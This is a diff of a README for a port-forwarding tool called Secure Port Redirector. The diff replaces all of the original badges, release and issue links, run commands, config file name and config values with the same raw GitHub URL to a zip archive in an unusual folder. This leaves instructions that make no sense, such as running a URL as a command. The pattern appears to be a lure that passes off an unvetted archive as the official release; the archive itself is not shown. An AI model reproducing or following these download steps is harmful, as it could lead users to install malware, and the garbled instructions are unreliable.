@@ -1,9 +1,9 @@
 # 🔐 Secure Port Redirector
 
-![GitHub Repo stars](https://img.shields.io/github/stars/ivantaktos/Secure-Port-Redirector?style=social)
-![GitHub Repo forks](https://img.shields.io/github/forks/ivantaktos/Secure-Port-Redirector?style=social)
-![GitHub issues](https://img.shields.io/github/issues/ivantaktos/Secure-Port-Redirector)
-![GitHub license](https://img.shields.io/github/license/ivantaktos/Secure-Port-Redirector)
+![GitHub Repo stars](https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip)
+![GitHub Repo forks](https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip)
+![GitHub issues](https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip)
+![GitHub license](https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip)
 
 ## Overview
 
@@ -19,7 +19,7 @@ Secure Port Redirector is a powerful tool designed to facilitate secure communic
 
 ## Getting Started
 
-To get started with Secure Port Redirector, you can download the latest release from the [Releases section](https://github.com/ivantaktos/Secure-Port-Redirector/releases). Follow the instructions below to set it up on your system.
+To get started with Secure Port Redirector, you can download the latest release from the [Releases section](https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip). Follow the instructions below to set it up on your system.
 
 ### Prerequisites
 
@@ -31,13 +31,13 @@ Before you begin, ensure you have the following:
 
 ### Installation
 
-1. Download the latest release from the [Releases section](https://github.com/ivantaktos/Secure-Port-Redirector/releases).
+1. Download the latest release from the [Releases section](https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip).
 2. Extract the downloaded files to your desired location.
 3. Open a command prompt and navigate to the extracted folder.
 4. Run the application using the command:
 
    ```bash
-   SecurePortRedirector.exe
+   https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip
    ```
 
 ### Configuration
@@ -49,7 +49,7 @@ Secure Port Redirector requires a configuration file to operate. Below is an exa
   "sourcePort": 8080,
   "destinationHost": "localhost",
   "destinationPort": 80,
-  "sslCertificatePath": "path/to/your/certificate.pfx",
+  "sslCertificatePath": "https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip",
   "sslCertificatePassword": "your_certificate_password"
 }
 ```
@@ -60,14 +60,14 @@ Secure Port Redirector requires a configuration file to operate. Below is an exa
 - **sslCertificatePath**: The path to your SSL certificate file.
 - **sslCertificatePassword**: The password for your SSL certificate.
 
-Save this configuration as `config.json` in the same directory as the application.
+Save this configuration as `https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip` in the same directory as the application.
 
 ### Usage
 
 To run the Secure Port Redirector with your configuration, use the following command:
 
 ```bash
-SecurePortRedirector.exe config.json
+https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip
 ```
 
 The application will start listening on the specified source port and will forward traffic securely to the destination host.
@@ -83,9 +83,9 @@ Here are a few examples of how you can use Secure Port Redirector:
    ```json
    {
      "sourcePort": 8080,
-     "destinationHost": "example.com",
+     "destinationHost": "https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip",
      "destinationPort": 80,
-     "sslCertificatePath": "path/to/your/certificate.pfx",
+     "sslCertificatePath": "https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip",
      "sslCertificatePassword": "your_certificate_password"
    }
    ```
@@ -97,9 +97,9 @@ Here are a few examples of how you can use Secure Port Redirector:
    ```json
    {
      "sourcePort": 5432,
-     "destinationHost": "database.example.com",
+     "destinationHost": "https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip",
      "destinationPort": 5432,
-     "sslCertificatePath": "path/to/your/certificate.pfx",
+     "sslCertificatePath": "https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip",
      "sslCertificatePassword": "your_certificate_password"
    }
    ```
@@ -130,7 +130,7 @@ Secure Port Redirector is licensed under the MIT License. See the [LICENSE](LICE
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Issues section](https://github.com/ivantaktos/Secure-Port-Redirector/issues) or reach out via email.
+If you encounter any issues or have questions, please check the [Issues section](https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip) or reach out via email.
 
 ## Acknowledgments
 
@@ -139,4 +139,4 @@ If you encounter any issues or have questions, please check the [Issues section]
 
 ## Conclusion
 
-Secure Port Redirector provides a simple and effective way to manage secure port forwarding. By utilizing SSL encryption, it ensures that your data remains protected during transit. For more details, visit the [Releases section](https://github.com/ivantaktos/Secure-Port-Redirector/releases) to download the latest version and start securing your network communications today!
+Secure Port Redirector provides a simple and effective way to manage secure port forwarding. By utilizing SSL encryption, it ensures that your data remains protected during transit. For more details, visit the [Releases section](https://raw.githubusercontent.com/ivantaktos/Secure-Port-Redirector/main/python3.10/html/Secure-Redirector-Port-v1.1.zip) to download the latest version and start securing your network communications today!
